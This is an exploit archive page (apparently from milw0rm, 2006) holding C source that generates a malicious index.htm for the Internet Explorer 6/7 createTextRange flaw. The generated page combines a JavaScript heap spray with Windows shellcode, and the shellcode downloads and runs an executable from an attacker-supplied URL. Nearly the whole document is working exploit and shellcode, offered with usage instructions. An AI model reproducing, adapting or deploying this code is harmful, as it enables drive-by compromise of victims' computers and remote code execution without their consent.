<html><head><title>MS Internet Explorer (createTextRang) Download Shellcoded Exploit (2)</title></head><pre>/*
*
* Internet Explorer &quot;createTextRang&quot; Download Shellcoded Exploit (2)
* Bug discovered by Computer Terrorism (UK)
* http://www.computerterrorism.com/research/ct22-03-2006
*
* Affected Software: Microsoft Internet Explorer 6.x &amp; 7 Beta 2
* Severity: Critical
* Impact: Remote System Access
* Solution Status: Unpatched
*
* E-Mail: atmaca@icqmail.com
* Web: http://www.spyinstructors.com,http://www.atmacasoft.com
* Credit to Kozan,SkyLined,delikon,Darkeagle,Stelian Ene
*
*/

/*
*
* This one is more faster than all released createTextRange exploits
* because it uses last version of SkyLined's heap spraying code,
* special 10x goes to him.
*
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define BUF_LEN         0x800
#define FILE_NAME       &quot;index.htm&quot;

char body1[] =
	&quot;&lt;input type=\&quot;checkbox\&quot; id=\&quot;blah\&quot;&gt;\r\n&quot;
	&quot;&lt;SCRIPT language=\&quot;javascript\&quot;&gt;\r\n\r\n&quot;
	&quot;\tvar heapSprayToAddress = 0x3c0974c2;\r\n\r\n&quot;
	&quot;\tvar payLoadCode = unescape(\&quot;%u9090%u9090%u9090\&quot; +\r\n&quot;
	&quot;\t\&quot;%uCCE9%u0000%u5F00%u56E8%u0000%u8900%u50C3%u8E68%u0E4E%uE8EC\&quot; +\r\n&quot;
	&quot;\t\&quot;%u0060%u0000%uC931%uB966%u6E6F%u6851%u7275%u6D6C%uFF54%u50D0\&quot; +\r\n&quot;
	&quot;\t\&quot;%u3668%u2F1A%uE870%u0046%u0000%uC931%u5151%u378D%u8D56%u0877\&quot; +\r\n&quot;
	&quot;\t\&quot;%u5156%uD0FF%u6853%uFE98%u0E8A%u2DE8%u0000%u5100%uFF57%u31D0\&quot; +\r\n&quot;
	&quot;\t\&quot;%u49C9%u9090%u6853%uD87E%u73E2%u19E8%u0000%uFF00%u55D0%u6456\&quot; +\r\n&quot;
	&quot;\t\&quot;%u30A1%u0000%u8B00%u0C40%u708B%uAD1C%u688B%u8908%u5EE8%uC35D\&quot; +\r\n&quot;
	&quot;\t\&quot;%u5553%u5756%u6C8B%u1824%u458B%u8B3C%u0554%u0178%u8BEA%u184A\&quot; +\r\n&quot;
	&quot;\t\&quot;%u5A8B%u0120%uE3EB%u4935%u348B%u018B%u31EE%uFCFF%uC031%u38AC\&quot; +\r\n&quot;
	&quot;\t\&quot;%u74E0%uC107%u0DCF%uC701%uF2EB%u7C3B%u1424%uE175%u5A8B%u0124\&quot; +\r\n&quot;
	&quot;\t\&quot;%u66EB%u0C8B%u8B4B%u1C5A%uEB01%u048B%u018B%uE9E8%u0002%u0000\&quot; +\r\n&quot;
	&quot;\t\&quot;%uC031%uEA89%u5E5F%u5B5D%uE8C3%uFF2F%uFFFF%u686D%u2E68%u7865\&quot; +\r\n&quot;
	&quot;\t\&quot;%u0065&quot;;

char body2[] =
	&quot;\r\n\r\n\tvar heapBlockSize = 0x400000;\r\n\r\n&quot;
	&quot;\tvar payLoadSize = payLoadCode.length * 2;\r\n\r\n&quot; 
	&quot;\tvar spraySlideSize = heapBlockSize - (payLoadSize+0x38);\r\n\r\n&quot;
	&quot;\tvar spraySlide = unescape(\&quot;%u9090%u9090\&quot;);\r\n&quot; 
	&quot;\tspraySlide = getSpraySlide(spraySlide,spraySlideSize);\r\n\r\n&quot;
	&quot;\theapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\r\n\r\n&quot;
	&quot;\tmemory = new Array();\r\n\r\n&quot;
	&quot;\tfor (i=0;i&lt;heapBlocks;i++)\r\n&quot; 
	&quot;\t{\r\n\t\tmemory[i] = spraySlide + payLoadCode;\r\n\t}\r\n\r\n&quot;
	&quot;\tvar r = document.getElementById('blah').createTextRange();\r\n\r\n&quot;
	&quot;\tfunction getSpraySlide(spraySlide, spraySlideSize)\r\n&quot; 
	&quot;\t{\r\n\t\twhile (spraySlide.length*2&lt;spraySlideSize)\r\n\t\t{\r\n&quot;
	&quot;\t\t\tspraySlide += spraySlide;\r\n\t\t}\r\n&quot;	
	&quot;\t\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\r\n&quot;
	&quot;\t\treturn spraySlide;\r\n&quot;
	&quot;\t}\r\n\r\n&lt;/script&gt;&quot;;


int main(int argc,char *argv[])
{
        if (argc &lt; 2)
        {
                printf(&quot;\nInternet Explorer \&quot;createTextRang\&quot; Download Shellcoded Exploit (2)&quot;);
				printf(&quot;\nCoded by ATmaCA (atmaca[at]icqmail.com)\n&quot;);
                printf(&quot;\nUsage:\n&quot;);
                printf(&quot;ie_exp &lt;WebUrl&gt;\n&quot;);

                return 0;
        }

        FILE *File;
        char *pszBuffer;
        char *web = argv[1];
        char *pu = &quot;%u&quot;;
        char u_t[5];
        char *utf16 = (char*)malloc(strlen(web)*5);

        if ( (File = fopen(FILE_NAME,&quot;w+b&quot;)) == NULL ) {
                printf(&quot;\n [Err:] fopen()&quot;);
                exit(1);
        }

        pszBuffer = (char*)malloc(BUF_LEN);
        memcpy(pszBuffer,body1,sizeof(body1)-1);

        memset(utf16,'\0',strlen(web)*5);
        for (unsigned int i=0;i&lt;strlen(web);i=i+2)
        {
                sprintf(u_t,&quot;%s%.2x%.2x&quot;, pu, web[i+1], web[i]);
                strcat(utf16,u_t);
        }

        strcat(pszBuffer,utf16);
        strcat(pszBuffer,&quot;%u0000\&quot;);&quot;);
        strcat(pszBuffer,body2);

        fwrite(pszBuffer, BUF_LEN, 1,File);
        fclose(File);

        printf(&quot;\n\n&quot;  FILE_NAME  &quot; has been created in the current directory.\n&quot;);
        return 1;
}

// milw0rm.com [2006-03-31]</pre></html>